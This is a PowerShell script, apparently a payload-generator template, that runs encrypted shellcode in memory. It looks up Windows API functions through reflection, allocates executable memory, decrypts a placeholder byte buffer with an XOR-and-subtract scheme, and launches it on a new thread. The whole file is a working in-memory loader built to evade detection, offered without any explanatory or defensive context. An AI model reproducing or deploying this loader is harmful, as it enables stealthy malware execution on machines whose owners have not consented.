function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = (
        [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object {
                $_.GlobalAssemblyCache -And
                $_.Location.Split('\\')[-1].Equals('System.dll') }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $GetProcAddress = ($assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}})[0]

    return $GetProcAddress.Invoke(
        $null,
        @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)
    )
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
                (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
                [System.Reflection.Emit.AssemblyBuilderAccess]::Run
            ).DefineDynamicModule(
                'InMemoryModule',
                $false
            ).DefineType(
                'MyDelegateType',
                'Class, Public, Sealed, AnsiClass, AutoClass',
                [System.MulticastDelegate]
            )

    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $func
    ).SetImplementationFlags('Runtime, Managed')

    $type.DefineMethod(
        'Invoke', 'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

function DecryptBytes {
    Param (
        $Bytes
    )

    [Byte[]] $decrypted = New-Object byte[] $Bytes.length

    for($i=0; $i -lt $Bytes.length; $i++)
    {
        $decrypted[$i] = $Bytes[$i] -bxor 0x75
        $decrypted[$i] = (($decrypted[$i] + 256) - 2) % 256
    }

    return $decrypted
}

$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])));
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])));
$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int])))


$lpMem = $VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = {{bytes}}
[Byte[]] $buf2 = DecryptBytes($buf)


[System.Runtime.InteropServices.Marshal]::Copy($buf2, 0, $lpMem, $buf.length)

$hThread = $CreateThread.Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

$WaitForSingleObject.Invoke($hThread, 0xFFFFFFFF)